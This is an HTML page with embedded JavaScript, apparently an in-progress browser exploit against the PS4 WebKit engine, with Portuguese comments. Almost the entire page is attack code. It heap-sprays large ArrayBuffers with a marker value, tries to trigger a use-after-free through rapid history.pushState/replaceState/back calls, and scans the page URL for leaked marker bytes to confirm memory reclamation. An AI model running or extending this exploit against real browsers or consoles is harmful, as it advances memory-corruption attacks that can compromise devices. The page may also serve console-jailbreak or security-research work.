<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Large Bin Reclamation</title>
</head>
<body>

<h2>PS4 WebKit - Large Bin Reclamation</h2>
<p>Status: <span id="status">Aguardando...</span></p>

<button onclick="runExploit()">EXECUTAR SPRAY + UAF</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { logEl.textContent += m + "\n"; }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function runExploit() {
    logEl.textContent = "";
    statusEl.textContent = "Spraying...";
    
    // 1. SPRAY DE OBJETOS GRANDES (340KB para bater com o ITER 48)
    log("Fase 1: Spraying Large ArrayBuffers (340356 bytes)...");
    let spray = [];
    const TARGET_SIZE = 340356; 
    
    for(let i = 0; i < 200; i++) {
        let buf = new ArrayBuffer(TARGET_SIZE);
        let view = new Uint32Array(buf);
        // Preenche com o marcador 0x1337BEEF + index
        for(let j = 0; j < view.length; j += 4) {
            view[j] = 0x1337BEEF;
            view[j+1] = i; 
        }
        spray.push(buf);
    }
    log("Spray concluído: 200 blocos de 340KB alocados.");

    // 2. TRIGGER UAF (Seu código estável)
    statusEl.textContent = "Triggering UAF...";
    log("Fase 2: Disparando UAF estável...");
    
    let size = 977;
    const STEP = 14461;
    for(let i = 0; i < 48; i++) {
        // Usando a técnica de % que funcionou no seu teste 2
        let pattern = "%41%42%43%44"; // ABCD em hex
        let frag = pattern.repeat(size / 12); 
        
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }

    log("Aguardando estabilização (100ms)...");
    await sleep(100);

    // 3. SCAN DE RECLAMAÇÃO
    statusEl.textContent = "Scanning...";
    let url = document.URL;
    log("URL vazada (Length): " + url.length);

    let found = false;
    // Procuramos pelo marcador 0x1337BEEF (em ASCII/UTF-8 o valor muda, buscamos por partes)
    for(let k = 0; k < url.length - 8; k++) {
        // Checa se os bytes do spray "atropelaram" o buffer da URL
        if(url.charCodeAt(k) === 0xEF && url.charCodeAt(k+1) === 0xBE) {
            log("!!! SUCESSO !!!");
            log("Marcador 0xBEEF encontrado no offset: " + k);
            found = true;
            break;
        }
    }

    if(!found) {
        log("Falha: Marcador não encontrado. Tentando dump parcial...");
        log("Primeiros 100 caracteres: " + url.substring(0, 100));
    }

    window.keepAlive = spray;
    statusEl.textContent = "Concluído.";
}
</script>

</body>
</html>
